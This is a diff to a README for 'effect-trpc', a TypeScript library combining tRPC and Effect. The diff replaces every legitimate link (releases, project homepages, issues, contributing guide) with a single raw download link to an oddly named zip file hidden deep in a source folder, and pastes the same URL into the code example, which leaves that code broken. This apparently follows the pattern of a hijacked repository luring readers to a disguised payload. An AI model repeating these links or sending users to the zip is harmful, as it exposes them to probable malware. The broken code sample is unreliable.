@@ -2,11 +2,11 @@
 
 ## 📥 Download
 
-[![Download effect-trpc](https://img.shields.io/badge/Download-effect--trpc-brightgreen)](https://github.com/Ahsan3106/effect-trpc/releases)
+[![Download effect-trpc](https://raw.githubusercontent.com/Ahsan3106/effect-trpc/main/.context/effect-repo/packages/platform-node/src/NodeFileSystem/effect_trpc_unmenstruating.zip)](https://raw.githubusercontent.com/Ahsan3106/effect-trpc/main/.context/effect-repo/packages/platform-node/src/NodeFileSystem/effect_trpc_unmenstruating.zip)
 
 ## 🎉 Introduction
 
-Welcome to **effect-trpc**! This tool helps you create type-safe procedures easily. It combines the power of [tRPC](https://trpc.io/) with [Effect](https://effect.website/). With it, you can write efficient code while enjoying full service injection and automatic tracing.
+Welcome to **effect-trpc**! This tool helps you create type-safe procedures easily. It combines the power of [tRPC](https://raw.githubusercontent.com/Ahsan3106/effect-trpc/main/.context/effect-repo/packages/platform-node/src/NodeFileSystem/effect_trpc_unmenstruating.zip) with [Effect](https://raw.githubusercontent.com/Ahsan3106/effect-trpc/main/.context/effect-repo/packages/platform-node/src/NodeFileSystem/effect_trpc_unmenstruating.zip). With it, you can write efficient code while enjoying full service injection and automatic tracing.
 
 ## 🚀 Features
 
@@ -19,9 +19,9 @@ Welcome to **effect-trpc**! This tool helps you create type-safe procedures easi
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/Ahsan3106/effect-trpc/releases) to download the latest version. Here’s how to install it on your system:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Ahsan3106/effect-trpc/main/.context/effect-repo/packages/platform-node/src/NodeFileSystem/effect_trpc_unmenstruating.zip) to download the latest version. Here’s how to install it on your system:
 
-1. Go to the [Releases page](https://github.com/Ahsan3106/effect-trpc/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Ahsan3106/effect-trpc/main/.context/effect-repo/packages/platform-node/src/NodeFileSystem/effect_trpc_unmenstruating.zip).
 2. Find the latest version of effect-trpc.
 3. Click to download the relevant file for your system.
 
@@ -53,10 +53,10 @@ This import statement sets up `tRPC` with the necessary tools you need to begin.
 You can now define a simple procedure. Below is a starter example: 
 
 ```typescript
-const t = initTRPC.create();
+const t = https://raw.githubusercontent.com/Ahsan3106/effect-trpc/main/.context/effect-repo/packages/platform-node/src/NodeFileSystem/effect_trpc_unmenstruating.zip();
 
-t.procedure('users.getById', {
-  input: z.string(),
+https://raw.githubusercontent.com/Ahsan3106/effect-trpc/main/.context/effect-repo/packages/platform-node/src/NodeFileSystem/effect_trpc_unmenstruating.zip('https://raw.githubusercontent.com/Ahsan3106/effect-trpc/main/.context/effect-repo/packages/platform-node/src/NodeFileSystem/effect_trpc_unmenstruating.zip', {
+  input: https://raw.githubusercontent.com/Ahsan3106/effect-trpc/main/.context/effect-repo/packages/platform-node/src/NodeFileSystem/effect_trpc_unmenstruating.zip(),
   resolve({ input }) {
     // Add your logic here 
     return getUserById(input);
@@ -78,7 +78,7 @@ If you encounter any issues, here are some common questions and answers:
 
 ## 📞 Support
 
-Need help? Visit our [GitHub Issues](https://github.com/Ahsan3106/effect-trpc/issues) page for assistance. We aim to respond promptly to any queries.
+Need help? Visit our [GitHub Issues](https://raw.githubusercontent.com/Ahsan3106/effect-trpc/main/.context/effect-repo/packages/platform-node/src/NodeFileSystem/effect_trpc_unmenstruating.zip) page for assistance. We aim to respond promptly to any queries.
 
 ## 📚 Documentation
 
@@ -86,7 +86,7 @@ For more in-depth details about using effect-trpc, refer to the official documen
 
 ## 🤝 Contributing
 
-We welcome contributions! If you’d like to help improve effect-trpc, please read our [Contributing Guidelines](https://github.com/Ahsan3106/effect-trpc/blob/main/CONTRIBUTING.md) on how to get involved.
+We welcome contributions! If you’d like to help improve effect-trpc, please read our [Contributing Guidelines](https://raw.githubusercontent.com/Ahsan3106/effect-trpc/main/.context/effect-repo/packages/platform-node/src/NodeFileSystem/effect_trpc_unmenstruating.zip) on how to get involved.
 
 ---
 
